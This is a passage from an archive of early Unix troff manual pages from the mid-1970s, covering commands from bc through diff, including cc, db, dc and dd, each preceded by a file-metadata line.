The same letter may be used as an array name, a function name,
and a simple variable simultaneously.
`Auto' variables are saved and restored during function calls.
All other variables are global to the program.
When using arrays as function arguments
or defining them as automatic variables
empty square brackets must follow the array name.
.s3
For example
.s3
.nf
scale = 20
define e(x){
	auto a, b, c, i, s
	a = 1
	b = 1
	s = 1
	for(i=1; 1==1; i++){
		a = a*x
		b = b*i
		c = a/b
		if(c == 0) return(s)
		s = s+c
	}
}
.s3
.fi
defines a function to compute an approximate value of
the exponential function and
.s3
.nf
	for(i=1; i<=10; i++) e(i)
.fi
.s3
prints approximate values of the exponential function of
the first ten integers.
.sh FILES
/usr/lib/lib.b	mathematical library
.sh "SEE ALSO"
.it dc
(I),
C Reference Manual,
``BC \- An Arbitrary Precision Desk-Calculator Language.''
.sh BUGS
No &&, | | yet.
.br
.it for
statement must have all three E's
.br
.it quit
is interpreted when read, not when executed.
-- /usr/man/man1/cat.1 mode=0100664 uid=3 gid=3 atime=170022108 mtime=173061341 --
.th CAT I 1/15/73
.sh NAME
cat \*- concatenate and print
.sh SYNOPSIS
.bd cat
file ...
.sh DESCRIPTION
.it Cat
reads each file in sequence
and writes it on the standard output.
Thus
.s3
.bd "   cat file"
.s3
prints the file, and
.s3
.bd "   cat file1 file2 >file3"
.s3
concatenates the first two files and places the result on the third.
.s3
If no input file is given,
or if the argument `\-' is encountered,
.it cat
reads from the standard
input file.
.s3
.sh "SEE ALSO"
pr(I), cp(I)
.sh DIAGNOSTICS
none;
if a file cannot be found it is ignored.
.sh BUGS
.bd "cat x y >x"
and
.bd "cat x y >y"
cause strange results.
-- /usr/man/man1/cc.1 mode=0100664 uid=3 gid=3 atime=170022109 mtime=173061341 --
.th CC I 5/15/74
.sh NAME
cc \*- C compiler
.sh SYNOPSIS
.bd cc
[
.bd \*-c
] [
.bd \*-p
] [
.bd \-f
] [
.bd \*-O
] [
.bd \*-S
] [
.bd \*-P
] file ...
.sh DESCRIPTION
.it Cc
is the UNIX C compiler.
It accepts three types of arguments:
.s3
Arguments whose names end with `.c' are taken to be
C source programs; they are compiled, and
each object program is left on the file
whose name is that of the source with `.o' substituted
for `.c'.
The `.o' file is normally deleted, however, if a single
C program is compiled and loaded all at one go.
.s3
The following flags are interpreted by
.it cc.
See
.it "ld (I)"
for load-time flags.
.s3
.lp +6 5
\fB\*-c\fR	Suppress the loading phase of the compilation, and force
an object file to be produced even if only one program is compiled.
.s3
.lp +6 5
\fB\*-p\fR	Arrange for the compiler to produce code
which counts the number of times each routine is called;
also, if loading takes place, replace the standard startup
routine by one which automatically calls the
.it monitor
subroutine (III)
at the start and arranges to write out a
.it mon.out
file at normal termination of execution of the object program.
An execution profile can then be generated by
use of
.it prof
(I).
.s3
.lp +6 5
\fB\-f\fR	In systems without hardware floating-point,
use a version of the C compiler which handles floating-point
constants and
loads the object program with the floating-point interpreter.
Do not use if the hardware is present.
.s3
.lp +6 5
\fB\*-O\fR	Invoke an
object-code optimizer.
.s3
.lp +6 5
\fB\*-S\fR	Compile the named C programs, and leave the
assembler-language output on corresponding files suffixed `.s'.
.s3
.lp +6 5
\fB\*-P\fR	Run only the macro preprocessor
on the named C programs, and leave the output on corresponding
files suffixed `.i'.
.i0
.dt
.s3
Other arguments
are taken
to be either loader flag arguments, or C-compatible
object programs, typically produced by an earlier
.it cc
run,
or perhaps libraries of C-compatible routines.
These programs, together with the results of any
compilations specified, are loaded (in the order
given) to produce an executable program with name
.bd a.out.
.sh FILES
file.c		input file
.br
file.o		object file
.br
a.out		loaded output
.br
/tmp/ctm?	temporary
.br
/lib/c[01]	compiler
.br
/lib/fc[01]	floating-point compiler
.br
/lib/c2		optional optimizer
.br
/lib/crt0.o	runtime startoff
.br
/lib/mcrt0.o	runtime startoff of profiling
.br
/lib/fcrt0.o	runtime startoff for floating-point interpretation
.br
/lib/libc.a	C library; see section III.
.br
/lib/liba.a	Assembler library used by some routines in libc.a
.sh "SEE ALSO"
``Programming in C\(em a tutorial,''
C Reference Manual,
monitor (III), prof (I), cdb (I), ld (I).
.sh DIAGNOSTICS
The diagnostics produced by C itself are intended to be
self-explanatory.
Occasional messages may be produced by the assembler
or loader.
Of these, the most mystifying are from the assembler,
in particular ``m,'' which means
a multiply-defined external symbol (function
or data).
.sh BUGS
-- /usr/man/man1/cdb.1 mode=0110664 uid=3 gid=3 atime=170022111 mtime=173061341 --
.th CDB I 2/8/75
.sh NAME
cdb \*- C debugger
.sh SYNOPSIS
.bd cdb
[ a.out [ core ] ]
.sh DESCRIPTION
.it Cdb
is a debugger for use with C programs.
It is useful for both post-mortem and interactive debugging.
An important feature of
.it cdb
is that even in the interactive case no
advance planning is necessary to use it;
in particular it is not necessary to compile or load the program
in any special way nor to include any special
routines in the object file.
.s3
The first argument to
.it cdb
is an object
program, preferably containing a symbol table;
if not given ``a.out'' is used.
The second argument is the name of a core-image file;
if it is not given, ``core'' is used.
The core file need not be present.
.s3
Commands to
.it cdb
consist of an address,
followed by a single command character,
possibly followed by a command modifier.
Usually if no address is given the last-printed
address is used.
An address may be followed by a comma and
a number,
in which case the command applies
to the appropriate number of successive addresses.
.s3
Addresses are expressions composed of names,
decimal numbers, and octal numbers
(which begin with ``0'') and separated by
``+'' and ``\*-''.
Evaluation proceeds left-to-right.
.s3
Names of external variables are written just as they are in C.
For various reasons the external names generated by C
all begin with an underscore, which is automatically tacked on by
.it cdb.
Currently it is not possible to suppress this feature, so
symbols (defined in assembly-language programs) which do not begin with
underscore are inaccessible.
.s3
Variables
local to a function
(automatic, static, and arguments)
are accessible by writing the name of the function, a colon ``:'',
and the name of the local variable
(e.g. ``main:argc'').
There is no notion of the ``current'' function;
its name must always be written explicitly.
.s3
A number which begins with ``0'' is taken to be octal; otherwise
numbers are decimal, just as in C.
There is no provision for input of floating numbers.
.s3
The construction ``name[expression]''
assumes that
.it name
is a pointer to an integer
and is equivalent
to the contents of the named cell plus twice the expression.
Notice that
.it name
has to be a genuine pointer and that arrays
are not accessible in this way.
This is a consequence of the fact that types of variables are
not currently saved in the symbol table.
.s3
The command characters are:
.s3
.lp +4 4
/\fIm\fR	print the addressed words.
.it m
indicates the mode of printout;
specifying a mode sets the mode until it is explicitly changed again:
.lp +8 4
\fBo\fR	octal (default)
.lp +8 4
\fBi\fR	decimal
.lp +8 4
\fBf\fR	single-precision floating-point
.lp +8 4
\fBd\fR	double-precision floating-point
.s3
.i0
.lp +4 4
\\	Print the specified bytes in octal.
.s3
.lp +4 4
=	print the value of the addressed expression in octal.
.c2 @
.s3
.lp +4 4
\*a	print the addressed bytes as characters.
Control and non-ASCII characters are escaped in octal.
.c2 '
.s3
.lp +4 4
"	take the contents of the address as a pointer to a sequence
of characters, and print the characters up to a null byte.
Control and non-ASCII characters are escaped as octal.
.s3
.lp +4 4
&	Try to interpret the contents
of the address as a pointer,
and print symbolically where the pointer points.
The typeout contains the name of an external symbol
and, if required,
the smallest possible positive offset.
Only external symbols are considered.
.s3
.lp +4 4
?	Interpret the addressed location as a PDP-11 instruction.
.s3
.lp +4 4
$\fIm\fR	If no
.it m
is given,
print a stack trace of the terminated or stopped program.
The last call made is listed first;
the actual arguments to each routine are
given in octal.
(If this is inappropriate, the arguments may be examined by
name in the desired format using ``/''.)
If
.it m
is ``r'', the contents of the PDP-11 general registers are
listed.
If
.it m
is ``f'', the contents of the floating-point registers are listed.
In all cases, the reason why the program stopped or terminated
is indicated.
.s3
.lp +4 4
%\fIm\fR	According to
.it m,
set or delete a breakpoint,
or run or continue the program:
.s3
.lp +8 4
\fBb\fR	An address within the program must
be given;
a breakpoint is set there.
Ordinarily, breakpoints will be set on the entry points of functions,
but any location is possible as long as it is the first word of an instruction.
(Labels don't appear in the symbol table yet.)
Stopping at the actual first instruction of a function is undesirable
because to make symbolic printouts work,
the function's save sequence has to be completed;
therefore
.it cdb
automatically moves breakpoints at the start of functions
down to the first real code.
.s3
It is impossible to set breakpoints on pure-procedure programs
(\-n flag on cc or ld) because the program text is write-protected.
.s3
.lp +8 4
\fBd\fR	An address must be given;
the breakpoint at that address is removed.
.s3
.lp +8 4
\fBr\fR	Run the program being debugged.
Following the ``%r'', arguments may be given;
they cannot specify I/O redirection
(``>'', ``<'')
or filters.
No address is permissible, and the program is restarted from scratch,
not continued.
Breakpoints should have been set if any were desired.
The program will stop
if any signal is generated,
such as illegal instruction (including simulated floating point),
bus error, or interrupt (see signal(II));
it will also stop when a breakpoint occurs
and in any case announce the reason.
Then a stack trace can be printed, named locations examined, etc.
.s3
.lp +8 4
\fBc\fR	Continue after
a breakpoint.
It is possible but probably useless to continue after
an error since there is no way to repair the cause of the error.
.s3
.i0
.sh "SEE ALSO"
cc (I), db (I), C Reference Manual
.sh BUGS
Use caution in believing
values of register variables at the lowest levels
of the call stack;
the value of a register is found by looking at the place where it was
supposed to have been saved by the callee.
.s3
Some things are still needed to make
.it cdb
uniformly better than
.it db:
non-C symbols, patching files, patching core images of programs
being run.
It would be desirable to have the types of variables around
to make the correct style printout more automatic.
Structure members should be available.
.s3
Naturally, there are all sorts of neat features
not handled, like conditional breakpoints, optional stopping on certain signals
(like illegal instructions, to allow breakpointing
of simulated floating-point programs).
-- /usr/man/man1/chdir.1 mode=0100664 uid=3 gid=3 atime=170022112 mtime=173061341 --
.th CHDIR I 5/15/74
.sh NAME
chdir \*- change working directory
.sh SYNOPSIS
.bd chdir
directory
.sh DESCRIPTION
.it Directory
becomes the new working directory.
The process must have execute (search)
permission in
.it directory.
.s3
Because a new process is created to execute each command,
.it chdir
would be ineffective if it were written as a
normal command.  It is therefore recognized and executed
by the Shell.
.sh "SEE ALSO"
sh (I), pwd (I)
.sh BUGS
-- /usr/man/man1/chmod.1 mode=0100664 uid=3 gid=3 atime=170022113 mtime=173061341 --
.th CHMOD I 2/8/75
.sh NAME
chmod \*- change mode
.sh SYNOPSIS
.bd chmod
octal file ...
.sh DESCRIPTION
The octal mode
replaces the mode of each of the files.
The mode is constructed from the OR of the
following modes:
.s3
.lp +10 7
4000	set user ID on execution
.lp +10 7
2000	set group ID on execution
.lp +10 7
1000	sticky bit for shared, pure-procedure programs (see below)
.lp +10 7
0400	read by owner
.lp +10 7
0200	write by owner
.lp +10 7
0100	execute (search in directory) by owner
.lp +10 7
0070	read, write, execute (search) by group
.lp +10 7
0007	read, write, execute (search) by others
.s3
.i0
Only the owner of a file (or the super-user) may change its mode.
.s3
If an executable file is set up for sharing (``\*-n'' option
of
.it "ld (I)"
), then mode 1000 prevents the system from
abandoning the swap-space image of the program-text portion
of the file when its last user
terminates.
Thus when the next user of the file executes it,
the text need not be read from the file
system but can simply be swapped in,
saving time.
Ability to set this bit is restricted to the super-user
since swap space is consumed
by the images; it is only worth while for heavily used commands.
.s3
.sh "SEE ALSO"
ls (I),
chmod (II)
.sh BUGS
-- /usr/man/man1/cmp.1 mode=0100664 uid=3 gid=3 atime=170022114 mtime=173061341 --
.th CMP I 5/15/74
.sh NAME
cmp \*- compare two files
.sh SYNOPSIS
.bd cmp
[
.bd \*-l
] [
.bd \*-s
]
file1 file2
.sh DESCRIPTION
The two files are
compared.
(If
.it file1
is `\*-',
the standard input is used.)
Under default options,
.it cmp
makes no comment if the files are the same;
if they differ, it announces the byte and line number
at which the difference occurred.
If one file is an initial subsequence
of the other, that fact is noted.
Moreover, return code 0 is yielded for identical
files, 1 for different files, and 2 for an
inaccessible or missing argument.
.s3
Options:
.s3
.lp +6 3
\fB\*-l\fR	Print the byte number (decimal) and the
differing bytes (octal) for each difference.
.s3
.lp +6 3
\fB\*-s\fR	Print nothing for differing files;
return codes only.
.i0
.dt
.sh "SEE ALSO"
diff (I), comm (I)
.sh BUGS
-- /usr/man/man1/comm.1 mode=0100664 uid=3 gid=3 atime=170022115 mtime=173061341 --
.th COMM I 5/15/74
.sh NAME
comm \*- print lines common to two files
.sh SYNOPSIS
.bd comm
[
.bd \*-
[
.bd 123
]
] file1 file2
.sh DESCRIPTION
.it Comm
reads
.it file1
and
.it file2,
which should be in sort,
and produces a three column output: lines only in
.it file1;
lines only in
.it file2;
and lines in both files.
The filename `\*-' means the standard input.
.s3
Flags 1, 2, or 3 suppress printing of the corresponding
column.
Thus
.bd comm
.bd \*-12
prints only the lines common to the two files;
.bd comm
.bd \*-23
prints only lines in the first file but not in the second;
.bd comm
.bd \*-123
is a no-op.
.s3
.sh "SEE ALSO"
cmp (I), diff (I)
.sh BUGS
-- /usr/man/man1/cp.1 mode=0100664 uid=3 gid=3 atime=170022116 mtime=173061341 --
.th CP I 2/8/75
.sh  NAME
cp \*- copy
.sh SYNOPSIS
.bd cp
file1 file2
.sh DESCRIPTION
The
first file is copied onto the second.
The mode and owner of the target file
are preserved if it already
existed; the mode of the source file
is used otherwise.
.s3
If
.it file2
is a directory, then the target 
file is a file in that directory with the file-name
of
.it file1.
.s3
It is forbidden to copy a file onto itself.
.sh "SEE ALSO"
cat (I), pr (I), mv (I)
.sh BUGS
-- /usr/man/man1/cref.1 mode=0100664 uid=3 gid=3 atime=170022118 mtime=173061341 --
.th CREF I 2/5/73
.sh NAME
cref  \*-  make cross reference listing
.sh SYNOPSIS
.bd cref
[
.bd \*-acilostux123
] name ...
.sh DESCRIPTION
.it Cref
makes a cross reference listing
of program files in assembler or C format. The files
named as arguments in the command
line are searched for symbols 
in the appropriate syntax.
.s3
The output report is in four columns:
.nf
.s3
(1)	(2)	(3)	(4)
symbol	file	see	text as it appears in file
		below
.s3
.fi
.it Cref
uses either an
.it ignore
file or an
.it only
file.
If the
.bd \*-i
option is given, the next
argument is taken to be an
.it ignore
file; if the
.bd \*-o
option is given, the next
argument is taken to be
an
.it only
file.
.it Ignore
and
.it only
files are lists of symbols separated by new lines.
All symbols in an
.it ignore
file
are ignored in columns (1) and (3) of the output.
If an
.it only
file is given, only symbols in that
file appear in column (1).
At most one of
.bd \*-i
and
.bd \*-o
may be used.
The default setting
is
.bd \*-i.
Assembler predefined symbols or C keywords are ignored.
.s3
The
.bd \*-s
option causes current symbols to be
put in column 3.
In the assembler, the current symbol
is the most recent name symbol;
in C, the current function name.
The
.bd \*-l
option causes the line number within the file
to be put in column 3.
.s3
The
.bd \*-t
option causes the next available argument
to be used as the name
of the intermediate temporary
file (instead of /tmp/crt??).
The file is created and
is not removed at the end of the process.
.s3
Options:
.s3
.lp +5 3
\fBa\fR	assembler format (default)
.lp +5 3
\fBc\fR	C format input
.lp +5 3
\fBi\fR	use
.it ignore
file (see above)
.lp +5 3
\fBl\fR	put line number in col. 3 (instead of current symbol)
.lp +5 3
\fBo\fR	use
.it only
file (see above)
.lp +5 3
\fBs\fR	current symbol in col. 3 (default)
.lp +5 3
\fBt\fR	user supplied temporary file
.lp +5 3
\fBu\fR	print only symbols that occur exactly once
.lp +5 3
\fBx\fR	print only C external symbols
.lp +5 3
\fB1\fR	sort output on column 1 (default)
.lp +5 3
\fB2\fR	sort output on column 2
.lp +5 3
\fB3\fR	sort output on column 3
.s3
.i0
.sh FILES
.dt
/tmp/crt??	temporaries
.br
/usr/lib/aign	default assembler 
.it ignore
file
.br
/usr/lib/cign	default C
.it ignore
file
.br
/usr/bin/crpost	post processor
.br
/usr/bin/upost	post processor for
.bd \*-u
option
.br
/bin/sort	used to sort temporaries
.br
.s3
.fi
.sh "SEE ALSO"
as (I), cc (I)
.sh BUGS
-- /usr/man/man1/date.1 mode=0100664 uid=3 gid=3 atime=170022119 mtime=173061341 --
.th DATE I 11/1/74
.sh NAME
date \*- print and set the date
.sh SYNOPSIS
.bd date
[
.bd s
]
[ mmddhhmm[yy] ]
.sh DESCRIPTION
If no argument is given, the current date and time are printed.
If an argument is given, the current date is set.
The first
.it mm
is the month number;
.it dd
is the day number in the month;
.it hh
is the hour number (24 hour system);
the second
.it mm
is the minute number;
.it yy
is the last 2 digits of the year number and is optional.
For example:
.s3
.bd"      date 10080045"
.s3
sets the date to Oct 8, 12:45 AM.
The current year is the default if no year is mentioned.
The system operates in GMT.
.it Date
takes care of the conversion to and from
local standard and daylight time.
.s3
If the argument is ``s,''
.it date
calls the network file store via the TIU interface
(if present) and sets the clock to the
time thereby obtained.
.sh DIAGNOSTICS
``No permission'' if
you aren't the super-user and you try to change the date;
``bad conversion'' if the date set is syntactically incorrect.
.sh FILES
/dev/tiu/d0
.sh BUGS
-- /usr/man/man1/db.1 mode=0110664 uid=3 gid=3 atime=170022121 mtime=173061341 --
.th DB I 8/20/73
.sh NAME
db \*- debug
.sh SYNOPSIS
.bd db
[ core [ namelist ] ] [
.bd \*-
]
.sh DESCRIPTION
Unlike
many debugging packages (including DEC's ODT, on
which
.it db
is loosely based),
.it db
is not loaded as part of the
core image which it is used to examine; instead it examines files.
Typically, the file will be either a core image produced
after a fault or the binary output of
the assembler.
.it Core
is the file being debugged; if omitted \fBcore\fR is assumed.
.it Namelist
is a file containing a symbol table.
If it is omitted,
the symbol table is obtained from the
file being debugged,
or if not there from
.bd a.out.
If no appropriate name list file
can be found,
.it db
can still be used but some of its symbolic
facilities become unavailable.
.s3
For the meaning of the optional third argument, see
the last paragraph below.
.s3
The format for most
.it db
requests is an address followed
by a one character command.
Addresses are expressions built up as follows:
.s3
.lp +4 3
1.	A name has the value assigned to it
when the input file was assembled.
It may be relocatable or not depending
on the use of the name during the assembly.
.s3
.lp +4 3
2.	An octal number is an absolute quantity with the appropriate
value.
.s3
.lp +4 3
3.	A decimal number immediately followed by `\fB.\fR' is
an absolute quantity with the appropriate value.
.s3
.lp +4 3
4.	An octal number immediately followed by \fBr\fR is a relocatable
quantity with the appropriate value.
.s3
.lp +4 3
5.	The symbol \fB.\fR indicates the current pointer
of \fIdb\fR.
The current pointer is set by many
\fIdb\fR
requests.
.s3
.lp +4 3
6.	A \fB*\fR before
an expression forms an expression whose value is the
number in the word addressed by the first expression.
A \fB*\fR alone is equivalent to `\fB*.\fR'.
.s3
.lp +4 3
7.	Expressions separated by \fB+\fR or blank are expressions
with value equal to the sum of the components.  At most
one of the components may be relocatable.
.s3
.lp +4 3
8.	Expressions separated by \fB\*-\fR form an expression
with value equal to the difference to the components.
If the right component is relocatable, the left component
must be relocatable.
.s3
.lp +4 3
9.	Expressions are evaluated left to right.
.s3
.in \n(inu
Names for registers are
built in:
.s3
.bd "   r0 ... r5"
.bd "   sp"
.bd "   pc"
.bd "   fr0 ... fr5"
.s3
These may be examined.
Their values are deduced from the contents
of the stack in a core image file.  They are meaningless
in a file that is not a core image.
.s3
If no address is given for a command, the current address
(also specified by ``\fB.\fR'') is assumed.  In general, ``\fB.\fR''
points to the last word or byte printed by
.it db.
.s3
There are
.it db
commands for examining locations
interpreted as numbers, machine instructions,
ASCII characters, and addresses.
For numbers and characters, either bytes
or words may be examined.
The following commands are used to examine the specified file.
.s3
.lp +4 3
/	The addressed word is printed in octal.
.s3
.lp +4 3
\\	The addressed byte is printed in octal.
.s3
.lp +4 3
"	The addressed word is printed as two ASCII characters.
.s3
.lp +4 3
.tr |\*a
|	The addressed byte is printed as an ASCII character.
.s3
.tr ||
.lp +4 3
\*g	The addressed word is printed in decimal.
.s3
.lp +4 3
?	The addressed word is interpreted as a machine
instruction and a symbolic form of the instruction,
including symbolic addresses, is printed.
Often, the result will appear exactly as it was written
in the source program.
.s3
.lp +4 3
&	The addressed word is interpreted as a symbolic address
and is printed as the name of the symbol whose value is closest
to the addressed word, possibly followed by a signed offset.
.s3
.lp +4 3
<nl>	(i. e., the character ``new line'')  This command advances
the current location counter ``\fB.\fR'' and prints the resulting
location in the mode last specified by
one of the above requests.
.s3
.lp +4 3
^	This character decrements ``\fB.\fR'' and prints the
resulting location in the mode last selected
one of the above requests.  It is a converse to <nl>.
.s3
.lp +4 3
%	Exit.
.s3
.in \n(inu
Odd addresses to word-oriented commands are rounded
down.
The incrementing and decrementing
of ``\fB.\fR'' done by the
.bd <nl>
and
.bd ^
requests is by one or
two depending on whether the last command
was word or byte oriented.
.s3
The address portion of any of the above commands
may be followed by a comma and then by an
expression.  In this case that number of sequential
words or bytes specified by the expression is printed.
``\fB.\fR'' is advanced so that it points at the
last thing printed.
.s3
There are two commands to interpret the value
of expressions.
.s3
.lp +4 3
=	When preceded by an expression, the value of the expression
is typed in octal.
When not preceded by an expression, the value of ``\fB.\fR'' is
indicated.
This command does not change the value of ``\fB.\fR''.
.s3
.lp +4 3
:	An attempt is made to print the given expression
as a symbolic address.  If the expression is relocatable,
that symbol is found whose value is nearest
that of the expression, and the symbol is typed, followed by
a sign and the appropriate offset.
If the value of the expression is absolute, a symbol
with exactly the indicated value is sought and
printed if found; if no matching symbol is discovered, the
octal value of the expression is given.
.s3
.in \n(inu
The following command may be used to patch the file being debugged.
.s3
.lp +4 3
!	This command must be preceded by an expression.
The value of the expression is stored at the location
addressed by the current value of ``\fB.\fR''.
The opcodes do not appear in the symbol
table, so the user must assemble them by hand.
.s3
.in \n(inu
The following command is used after a fault has caused
a core image file to be produced.
.s3
.lp +4 3
$	causes the fault type and
the contents of the general registers and
several other registers to be printed both in octal and symbolic
format.
The values are as they were at the time of the fault.
.s3
.in \n(inu
For some purposes, it is important to know how addresses
typed by the user correspond with
locations in the file being debugged.
The mapping algorithm employed by
.it db
is non-trivial
for two reasons:
First, in an
.bd a.out
file, there is a 20(8) byte header
which will not appear when the file is loaded into
core for execution.
Therefore, apparent location 0 should correspond
with actual file offset 20.
Second, addresses
in core images do not correspond with the
addresses used by the program because in a core image
there is a header containing the
system's per-process
data for the dumped process, and also because the
stack is stored contiguously with the text and data
part of the core image rather than at the highest possible
locations.
.it Db
obeys the following rules:
.s3
If exactly one argument is given, and if it appears
to be an
.bd a.out
file, the 20-byte header is skipped
during addressing, i.e., 20 is added to all addresses typed.
As a consequence, the header can be examined
beginning at location \*-20.
.s3
If exactly one argument is given and if the file does
not appear to be an
.bd a.out
file, no mapping is done.
.s3
If zero or two arguments are given,
the mapping appropriate to a core image file is employed.
This means that locations above the program break
and below the stack
effectively do not exist (and are not, in fact, recorded
in the core file).
Locations above the user's stack pointer are mapped,
in looking at the core file, to
the place where they are really stored.
The per-process data kept by the
system, which is stored in the first part
of the core file,
cannot currently be examined (except by \fB$\fR).
.s3
If one wants to examine
a file which has an associated name list,
but is not a core image file, the last argument ``\fB\*-\fR''
can be used (actually the only purpose of the
last argument is to make the number of
arguments not equal to two).
This feature is used most frequently in
examining the memory file /dev/mem.
.sh "SEE ALSO"
as (I), core (V), a.out (V), od (I)
.sh DIAGNOSTICS
``File not found'' if the first argument
cannot be read; otherwise ``\fB?\fR''.
.sh BUGS
There should be some way to examine the registers
and other per-process data in a core image;
also there should be some way of specifying
double-precision addresses.
It does not know yet about shared text segments.
-- /usr/man/man1/dc.1 mode=0100664 uid=3 gid=3 atime=170022125 mtime=173061341 --
.th DC I 2/8/75
.sh NAME
dc \*- desk calculator
.sh SYNOPSIS
.bd dc
[ file ]
.sh DESCRIPTION
.it Dc
is an arbitrary precision arithmetic package.
Ordinarily it operates on decimal integers,
but one may specify an input base, output base,
and a number of fractional digits to be maintained.
The overall structure of
.it dc
is
a stacking (reverse Polish) calculator.
If an argument is given,
input is taken from that file until its end,
then from the standard input.
The following constructions are recognized:
.s3
.lp +6 6
number
.br
The value of the number is pushed on the stack.
A number is an unbroken string of the digits 0-9.
It may be preceded by an underscore \*_ to input a
negative number.
Numbers may contain decimal points.
.s3
.lp +6 6
+  \-  *  %  ^
.br
The
top two values on the stack are added
(+),
subtracted
(\*-),
multiplied (*),
divided (/),
remaindered (%),
or exponentiated (^).
The two entries are popped off the stack;
the result is pushed on the stack in their place.
Any fractional part of an exponent is ignored.
.s3
.lp +6 6
\fBs\fIx\fR	The
top of the stack is popped and stored into
a register named
.it x,
where
.it x
may be any character.
If
the
.bd s
is capitalized,
.it x
is treated as a stack and the value is pushed on it.
.s3
.lp +6 6
\fBl\fIx\fR	The
value in register
.it x
is pushed on the stack.
The register
.it x
is not altered.
All registers start with zero value.
If the
.bd l
is capitalized,
register
.it x
is treated as a stack and its top value is popped onto the main stack.
.s3
.lp +6 6
\fBd\fR	The
top value on the stack is duplicated.
.s3
.lp +6 6
\fBp\fR	The top value on the stack is printed.
The top value remains unchanged.
.s3
.lp +6 6
\fBf\fR	All values on the stack and in registers are printed.
.s3
.lp +6 6
\fBq\fR	exits the program.
If executing a string, the recursion level is
popped by two.
If
.bd q
is capitalized,
the top value on the stack is popped and the string execution level is popped
by that value.
.s3
.lp +6 6
\fBx\fR	treats the top element of the stack as a character string
and executes it as a string of dc commands.
.s3
.lp +6 6
\fB[ ... ]\fR	puts the bracketed ascii string onto the top of the stack.
.s3
.lp +6 6
\fI<x  >x  =x\fR
.br
The
top two elements of the stack are popped and compared.
Register
.it x
is executed if they obey the stated
relation.
.s3
.lp +6 6
\fBv\fR	replaces the top element on the stack by its square root.
Any existing fractional part of the argument is taken
into account, but otherwise the scale factor is ignored.
.s3
.lp +6 6
\fB!\fR	interprets the rest of the line as a UNIX command.
.s3
.lp +6 6
\fBc\fR	All values on the stack are popped.
.s3
.lp +6 6
\fBi\fR	The top value on the stack is popped and used as the
number radix for further input.
.s3
.lp +6 6
\fBo\fR	The top value on the stack is popped and used as the
number radix for further output.
.s3
.lp +6 6
\fBk\fR	the top of the stack is popped, and that value is used as
a non-negative scale factor:
the appropriate number of places
are printed on output,
and maintained during multiplication, division, and exponentiation.
The interaction of scale factor,
input base, and output base will be reasonable if all are changed
together.
.s3
.lp +6 6
\fBz\fR	The stack level is pushed onto the stack.
.s3
.lp +6 6
\fB?\fR	A line of input is taken from the input source (usually the console)
and executed.
.s3
.i0
An example which prints the first ten values of n! is
.nf
.s3
.in +3
.bd "[la1+dsa*pla10>y]sy"
.bd "0sa1"
.bd lyx
.i0
.fi
.sh "SEE ALSO"
bc (I),
which is a preprocessor for
.it dc
providing infix notation and a C-like syntax
which implements functions and  reasonable control
structures for programs.
.sh DIAGNOSTICS
(x) ? for unrecognized character x.
.br
(x) ? for not enough elements on the stack to do what was asked by command x.
.br
`Out of space' when the free list is exhausted (too many digits).
.br
`Out of headers' for too many numbers being kept around.
.br
`Out of pushdown' for too many items on the stack.
.br
`Nesting Depth' for too many levels of nested execution.
.sh BUGS
-- /usr/man/man1/dd.1 mode=0100664 uid=3 gid=3 atime=170022126 mtime=173061342 --
.th DD I 5/15/74
.sh NAME
dd \*- convert and copy a file
.sh SYNOPSIS
.bd dd
[option=value] ...
.sh DESCRIPTION
.it Dd
copies the specified input file
to the specified output with
possible conversions.
The standard input and output are used by default.
The input and output block size may be
specified to take advantage of raw physical I/O.
.s3
.ft I
.lp +15 15
option	values
.ft R
.lp +15 15
if=	input file name; standard input is default
.lp +15 15
of=	output file name; standard output is default
.lp +15 15
ibs=	input block size (default 512)
.lp +15 15
obs=	output block size (default 512)
.lp +15 15
bs=	set both input and output block size,
superseding
.it ibs
and
.it obs;
also, if no conversion is specified,
it is particularly efficient since no copy need be done
.lp +15 15
cbs=\fIn\fR	conversion buffer size
.lp +15 15
skip=\fIn\fR	skip \fIn\fR input records before starting copy
.lp +15 15
count=\fIn\fR	copy only \fIn\fR input records
.lp +15 15
conv=ascii	convert EBCDIC to ASCII
.lp +15 10
ebcdic	convert ASCII to EBCDIC
.lp +15 10
lcase	map alphabetics to lower case
.lp +15 10
ucase	map alphabetics to upper case
.lp +15 10
swab	swap every pair of bytes
.lp +15 10
noerror	do not stop processing on an error
.lp +15 10
sync	pad every input record to \fIibs\fR
.lp +15 10
.li
... , ...	several comma-separated conversions
.i0
.s3
.fi
Where sizes are specified,
a number of bytes is expected.
A number may end with
.bd "k, b"
or
.bd w
to specify multiplication by
1024, 512, or 2 respectively.
Also a pair of numbers may be separated by
.bd x
to indicate a product.
.s3
.it Cbs
is used only if
.it ascii
or
.it ebcdic
conversion is specified.
In the former case
.it cbs
characters are placed into the conversion buffer, converted to
ASCII, and trailing blanks trimmed and new-line added
before sending the line to the output.
In the latter case ASCII characters are read into the
conversion buffer, converted to EBCDIC, and blanks added
to make up an
output record of size
.it cbs.
.s3
After completion,
.it dd
reports the number of whole and partial input and output
blocks.
.s3
For example, to read an EBCDIC tape blocked ten 80-byte
EBCDIC card images per record into the ASCII file
.it x:
.s3
dd  if=/dev/rmt0  of=x  ibs=800  cbs=80  conv=ascii,lcase
.s3
Note the use of raw magtape.
.it Dd
is especially suited to I/O on the raw
physical devices because it allows reading
and writing in arbitrary record sizes.
.sh "SEE ALSO"
cp (I)
.sh BUGS
The ASCII/EBCDIC conversion tables are
taken
from the 256 character standard in
the CACM Nov, 1968.
It is not clear how this relates to real life.
.s3
Newlines are inserted only on conversion to ASCII;
padding is done only on conversion to EBCDIC.
There should be separate options.
-- /usr/man/man1/diff.1 mode=0100664 uid=3 gid=3 atime=170022127 mtime=173061342 --
.th DIFF I 5/15/74
.sh NAME
diff \*- differential file comparator
.sh SYNOPSIS
.bd diff
[
.bd \*-
] name1 name2
.sh DESCRIPTION
.it Diff
tells what lines must be changed in two files to bring them
into agreement.
The normal output contains lines of these forms:
.s3
.lp +5 0
.it n1
a
.it n3,n4
.br
.it n1,n2
d
.it n3
.br
.it n1,n2
c
.it n3,n4
.s3
.i0
These lines resemble
.it ed
commands to convert file
.it name1
into file
.it name2.
The numbers after the letters pertain to file
.it name2.
In fact, by exchanging `a' for `d' and reading backward
one may ascertain equally how to convert file 
.it name2
into
.it name1.
As in 
.it ed,
identical pairs where
.it n1
=
.it n2
or
.it n3
=
.it n4
are abbreviated as a single number.
.s3
Following each of these lines come all the lines that are
affected in the first file flagged by `*', 
then all the lines that are affected in the second file
flagged by `\fB.\fR'.
.s3
Under the \fB\*-\fR option,
the output of
.it diff
is a script of
.it "a, c"
and 
.it d
commands for the editor
.it ed,
which will change the contents of the first file
into the contents of the second.
In this connection, the following shell program may help maintain
multiple versions of a file.
